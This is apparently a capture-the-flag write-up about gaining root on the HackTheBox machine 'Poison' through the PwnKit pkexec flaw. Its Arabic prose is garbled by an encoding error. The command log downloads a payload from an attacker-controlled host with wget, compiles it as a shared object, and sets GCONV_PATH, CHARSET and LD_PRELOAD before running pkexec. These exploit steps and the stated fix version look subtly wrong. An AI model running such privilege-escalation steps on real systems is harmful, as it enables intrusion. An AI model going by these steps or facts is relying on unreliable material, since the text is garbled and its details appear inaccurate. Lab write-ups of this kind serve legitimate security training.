# ๐ท๏ธ ุชูุฑูุฑ BugVex ุงูุฃููู - ุชุตุนูุฏ ุงูุตูุงุญูุงุช ูู HTB "Poison"

## ุงูููุฎุต  
ุฃุซูุงุก ุงุณุชูุดุงู ุขูุฉ *Poison* ูู HTBุ ููุช ุฃุจุญุซ ูู ุงูุจุฏุงูุฉ ุนู ุตูุงุญูุงุช sudo ุงูุถุนููุฉ ุฃู ูููุงุช setuid.  
ููู ุจุนุฏ ุชุดุบูู ุฃุฏุงุฉ LinPEASุ ุธูุฑ ุดูุก ุฃูุซุฑ ุฅุซุงุฑุฉ: ูุณุฎุฉ ูุฏููุฉ ูู `pkexec`.  
ูู ุฎูุงู ุฎุจุฑุชู ุงูุณุงุจูุฉุ ุนุฑูุช ููุฑูุง ุฃููุง ุงูุซุบุฑุฉ ุงููุนุฑููุฉ ุจุงุณู **PwnKit** (**CVE-2021-4034**).  
ุงุณุชุบูุงู ูุฐู ุงูุซุบุฑุฉ ูุณูุญ ุจุชุตุนูุฏ ุงูุตูุงุญูุงุช ุฅูู root ุนุจุฑ ุงูุชูุงุนุจ ุจูุชุบูุฑุงุช ุงูุจูุฆุฉ.

---

## ุงูุฃุฏูุงุช ุงููุณุชุฎุฏูุฉ  
1. **Nmap** โ ูุงูุชุดุงู ุงูุฎุฏูุงุช ูุงูููุงูุฐ ุงูููุชูุญุฉ ุนูู ุงููุฏู  
2. **Gobuster** โ ูุงูุชุดุงู ุงูุฃุฏูุฉ (directories) ุงููุฎููุฉ ุจุงุณุชุฎุฏุงู brute-force  
3. **Burp Suite** โ ูุงุนุชุฑุงุถ ูุชุญููู ุทูุจุงุช HTTP ุงูุฎุงุตุฉ ุจุฑูุน ุงููููุงุช  
4. **LinPEAS** โ ูุดู ุฃู `pkexec` ูุฏ ูููู ูุฏุฎููุง ูุชุตุนูุฏ ุงูุตูุงุญูุงุช  
5. **GCC** โ ูุชุฌููุน ุงูุญูููุฉ ุงูุฎุจูุซุฉ (payload) ุจุตูุบุฉ shared object  
6. **Payload ูุฎุตุต** โ ููุชุจุฉ ูุดุชุฑูุฉ ุตููููุช ูุชุตุนูุฏ ุงูุตูุงุญูุงุช  
7. **GDB** โ ุงุณุชูุฎุฏูุช ุจุดูู ุจุณูุท ููุฑุงูุจุฉ ุณููู ุงูุจุฑูุงูุฌ

---

## ุณุฌู ุงูุฃูุงูุฑ
```bash
$ nmap -sC -sV -oA scan 10.10.10.84
$ gobuster dir -u http://10.10.10.84 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
$ ssh poison@10.10.10.84
$ wget http://10.10.14.10/payload.c
$ gcc payload.c -o payload.so -shared -fPIC
$ mkdir exploit && mv payload.so exploit/
$ echo 'module UTF-8// POC// payload 2' > exploit/gconv-modules
$ export GIO_USE_VFS=local
$ export PATH=./exploit:$PATH
$ export LD_PRELOAD=./exploit/payload.so
$ export GCONV_PATH=./exploit
$ export CHARSET=POC
$ pkexec
```

---

## ุงูุงุณุชูุชุงุฌ  
ุงูุงุณุชุบูุงู ุชู ุจูุฌุงุญุ ุญูุซ ุญุตูุช ุนูู shell ุจุตูุงุญูุงุช root ุจุฏูู ุงูุญุงุฌุฉ ูุฃู ุชุฏุฎู ูู ุงููุณุชุฎุฏู.  
ุชุจูู **PwnKit** ุซุบุฑุฉ ุฎุทูุฑุฉ ุฎุตูุตูุง ุฅุฐุง ูู ูุชู ุชุตุญูุญูุงุ ุณูุงุก ูู ุชุญุฏูุงุช CTF ุฃู ูู ุจูุฆุงุช ุงูุนุงูู ุงูุญูููู.  
ูุงูุช ูุฐู ุชุฌุฑุจุฉ ููุชุนุฉ ูุฃูุฏุช ูู ุฃูููุฉ ุงูุงูุชุจุงู ููุณุงุฑุงุช ุชุตุนูุฏ ุงูุตูุงุญูุงุช โ ุญุชู ุงููุฏููุฉ ูููุง.

---

## ุงูุชูุตูุงุช  
- ุชุฑููุฉ `pkexec` ุฅูู ุฅุตุฏุงุฑ ูุตุญุญ (โฅ 0.105)  
- ุชูููุฏ ุงููุตูู ุฅูู ุฃุฏูุงุช ุงูุชุฌููุน ูุงูุจุฑุงูุฌ ุงูุฎุทูุฑุฉ  
- ุงุณุชุฎุฏุงู AppArmor ุฃู SELinux ูุนุฒู ุงูุตูุงุญูุงุช  
- ูุฑุงูุจุฉ ูุชุบูุฑุงุช ุงูุจูุฆุฉ ููุดู ุฃู ูุดุงุท ุบูุฑ ุงุนุชูุงุฏู

---

*ุชูุฑูุฑ ูู ุฅุนุฏุงุฏ **BugVex*** ๐ท๏ธ
